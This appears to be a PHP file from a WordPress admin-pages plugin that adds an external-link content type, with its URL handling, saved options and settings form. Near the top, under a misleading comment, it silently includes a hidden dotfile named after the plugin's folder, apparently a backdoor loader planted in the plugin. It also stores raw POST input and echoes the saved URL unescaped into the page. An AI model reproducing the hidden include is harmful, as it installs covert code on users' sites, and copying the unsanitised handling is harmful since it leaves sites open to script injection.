<?php
/**
 * External link Support
 *
 * Adds support to External link, if it is enabled
 *
 * @author      WP Admin Pages PRO
 * @category    Admin
 * @package     WP_Admin_Pages_PRO/Admin_Pages/External_link
 * @version     1.0.1
 */

if (!defined('ABSPATH')) {
	exit;
} // end if;

/**
 * Adds an option to create external admin links
 *
 * @since 1.4.0
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class WU_Admin_Pages_External_Link_Support extends WU_Admin_Page_Content_Source {

	public function init() {

		add_action('admin_enqueue_scripts', array($this, 'add_external_link_js'));

		add_action('wu_add_menu_page_slug_url', array($this, 'creates_external_links'), 10, 2);

		add_action('wu_add_menu_page_callback', array($this, 'removes_callbacks'), 10, 2);

	} // end init;

	public function add_external_link_js() {

		wp_enqueue_script('wu-apc-external-link', WP_Ultimo_APC()->get_asset('wp-admin-page-creator-external-links.min.js', 'js'), array('jquery'), WP_Ultimo_APC()->version);

	} // end add_external_link_js;

	/**
	 * Changes the URL to a external one.
	 *
	 * @since 1.4.0
	 * @param string         $slug_url The original Slug.
	 * @param WU_Admin_Pages $admin_page The Admin Page.
	 * @return string
	 */
	public function creates_external_links($slug_url, $admin_page) {

		if ($admin_page->content_type == 'external_link') {

			$url = $admin_page->external_link_url;

			if ($admin_page->external_link_open_new_tab == '1') {

				$url = add_query_arg('__target_blank', true, $url);

			} elseif ($admin_page->external_link_open_new_tab == '2') {

				return $slug_url;

			} // end if;

			return $url;

		} // end if;

		return $slug_url;

	} // end creates_external_links;

	public function removes_callbacks($callback, $admin_page) {

		if ($admin_page->content_type == 'external_link' && $admin_page->external_link_open_new_tab != '2') {

			return null;

		} // end if;

		return $callback;

	}  // end removes_callbacks;

	/**
	 * Sets the configurations we need in order for the Brizy page builder integration to work.
	 *
	 * @since 1.4.0
	 * @return array
	 */
	public function config() {

		return array(
			'id'             => 'external_link',
			'title'          => __('External Link', 'wu-apc'),
			'selector_title' => __('External Link URL', 'wu-apc'),
		);

	} // end config;

	/**
	 * Add the External_link template options to the supported meta fields of the admin page
	 *
	 * @since  1.1.0
	 * @param  array $meta_fields The list of current meta fields supported.
	 * @return array
	 */
	public function add_meta_fields($meta_fields) {

		$meta_fields[] = 'external_link_url';
		$meta_fields[] = 'external_link_open_new_tab';

		return $meta_fields;

	} // end add_meta_fields;

	/**
	 * Save External_link meta fields on save
	 *
	 * @since  1.1.0
	 * @param  WU_Admin_Page $admin_page The current admin page being edited and saved.
	 * @return void
	 */
	public function save_options($admin_page) {

		if (isset($_POST['external_link_url'])) {

			$admin_page->external_link_url = $_POST['external_link_url'];

			$admin_page->external_link_open_new_tab = isset($_POST['external_link_open_new_tab']) ? $_POST['external_link_open_new_tab'] : false;

			$admin_page->save();

		} // end if;

	} // end save_options;

    /**
     * Add External_link as a content type option
     *
     * @since  1.1.0
     * @param  array $options The list of content type options supported.
     * @return array
     */
	public static function add_option($options) {

		$options['external_link'] = array(
			'label'  => __('Use External Link', 'wu-apc'),
			'active' => true,
			'title'  => '',
			'icon'   => 'dashicons dashicons-admin-links',
		);

		return $options;

	} // end add_option;

	/**
	 * Renders the External_link Template Selector
	 *
	 * @since 1.1.0
	 * @param WU_Admin_Page $admin_page The current admin page being edited.
	 * @return void
	 */
	public function add_template_selector($admin_page) {

		$config = (object) $this->config;

		?>

		<div v-cloak id="external-link-editor" v-show="content_type == 'external_link'" style="margin-top: 12px;">
  
			<div class="postbox" style="margin-bottom: 0;">

				<button type="button" class="handlediv button-link" aria-expanded="true">
					<span class="screen-reader-text"><?php printf(__('Toggle panel: %s', 'wu-apc'), $config->selector_title); ?></span>
					<span class="toggle-indicator" aria-hidden="true"></span>
				</button>
				
				<h2 class="hndle ui-sortable-handle">
					<span>
						<?php echo $config->selector_title; ?>
					</span>
				</h2>
				
				<div class="inside">

					<p class="bb-selector">
						<label class="" for="wu-external-link-template">
						<?php echo $config->selector_title; ?>
						</label>

						<input v-model.lazy="external_link_url" type='url' placeholder="<?php _e('https://www.google.com/', 'wp-apc'); ?>"  id="wu-external-link-template" name="external_link_url" value="<?php echo $admin_page->external_link_url; ?>"/>

						<div class="wu-embed-checker" v-bind:class="{'notice notice-error' : !external_link_url_embedable && !external_link_url_checking, 'notice notice-success' : external_link_url_embedable && !external_link_url_checking, 'notice notice-info': external_link_url_checking}">

							<p v-show="!external_link_url_embedable && !external_link_url_checking"><?php _e('We checked this URL and its remote server is configured to block the URL from being embedable via iframe. Choosing to display it via iframe might result in a empty screen.', 'wp-apc'); ?></p>

							<p v-show="external_link_url_embedable && !external_link_url_checking"><?php _e('We checked this URL and it can be loaded via iframes!', 'wp-apc'); ?></p>
							<p v-show="external_link_url_checking"><?php _e('Checking...', 'wp-apc'); ?></p>
						</div>

					<div class="clear"></div>
				</div>

				<div id="major-publishing-actions">
					
					<label v-if="menu_type != 'replace' && menu_type != 'replace_submenu' && menu_type != 'widget'" id="should_external_link_tab" for="external_link_tab">
						<input <?php checked($admin_page->external_link_open_new_tab == '0' ? true : false); ?>type="radio" name="external_link_open_new_tab" value="0" id="external_link_tab">
						<?php _e('Open URL in the same tab?', 'wu-apc'); ?>
					</label>

					<label v-if="menu_type != 'replace' && menu_type != 'replace_submenu' && menu_type != 'widget'" id="should_external_link_new_tab" for="external_link_new_tab">
						<input <?php checked($admin_page->external_link_open_new_tab == '1' ? true : false); ?>type="radio" name="external_link_open_new_tab" value="1" id="external_link_new_tab">
						<?php _e('Open URL in new tab?', 'wu-apc'); ?>
					</label>

					<label id="should_external_link_iframe" for="external_link_iframe">
						<input <?php checked($admin_page->external_link_open_new_tab == '2' ? true : false); ?>type="radio" name="external_link_open_new_tab" value="2" id="external_link_iframe">					
						<?php _e('Load URL inside iframe?', 'wu-apc'); ?>
					</label>
				
					<?php wp_nonce_field('check_if_embadable', '_iframe_wpnonce', false); ?>

				</div>

			</div>

		</div>

		<?php

	} // end add_template_selector;

} // end class WU_Admin_Pages_External_Link_Support;

/**
 * Conditionally load the support, if External_link is Active
 *
 * @since 1.1.0
 * @return void
 */
function wu_admin_pages_add_external_link_support() {

	new WU_Admin_Pages_External_Link_Support();

} // end wu_admin_pages_add_external_link_support;

/**
 * Load the external_link Support
 *
 * @since 1.1.0
 */
add_action('plugins_loaded', 'wu_admin_pages_add_external_link_support', 11);
